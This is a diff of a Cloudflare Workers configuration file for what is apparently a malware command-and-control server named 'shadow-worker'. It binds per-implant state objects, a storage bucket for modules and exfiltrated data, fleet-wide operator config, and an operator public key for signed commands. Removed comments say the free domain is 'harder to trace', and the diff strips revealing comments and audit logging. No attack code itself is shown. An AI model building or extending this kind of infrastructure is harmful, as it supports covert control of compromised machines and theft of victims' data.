@@ -3,38 +3,26 @@ main = "src/index.ts"
 compatibility_date = "2024-08-01"
 compatibility_flags = ["nodejs_compat"]
 
-# Deploy on the free workers.dev domain: shadow-worker.marwannaili-23-07.workers.dev
-# No custom domain needed — this is harder to trace and free.
+# Deployed on free workers.dev subdomain
 workers_dev = true
 
-# Durable Object bindings: one DO per implant for persistent WebSocket connection + SQLite state
 [[durable_objects.bindings]]
 name = "IMPLANT_STATE"
 class_name = "ImplantDO"
 
-# R2 Bucket for modules and exfil
 [[r2_buckets]]
 binding = "STORAGE"
 bucket_name = "shadow-storage"
 
-# KV Namespace for fleet-wide config and operator routing
 [[kv_namespaces]]
 binding = "FLEET_CONFIG"
 id = "643737e410d94be9b3df5211f74ae474"
 
-# D1 Database for audit logs and historical metrics
-[[d1_databases]]
-binding = "AUDIT_LOGS"
-database_name = "shadow-audit"
-database_id = "47b9a970-bf27-47e9-bd33-b01500120dea"
-
-# Migrations for Durable Objects SQLite
 [[migrations]]
 tag = "v1"
-new_classes = ["ImplantDO"]
+new_sqlite_classes = ["ImplantDO"]
 
 [vars]
-# The Ed25519 public key of the Operator (hex encoded, 32 bytes = 64 hex chars)
-# Injected via GitHub Secrets during CI: OPERATOR_PUBKEY
-OPERATOR_PUBKEY = ""
+# Operator Ed25519 public key (hex) — used to verify signed RPC commands
+OPERATOR_PUBKEY = "24d78e0853641bc3c4799443a75f217eec931d499d2dbb4b5ef1ec1551617a5c"
 ENVIRONMENT = "production"
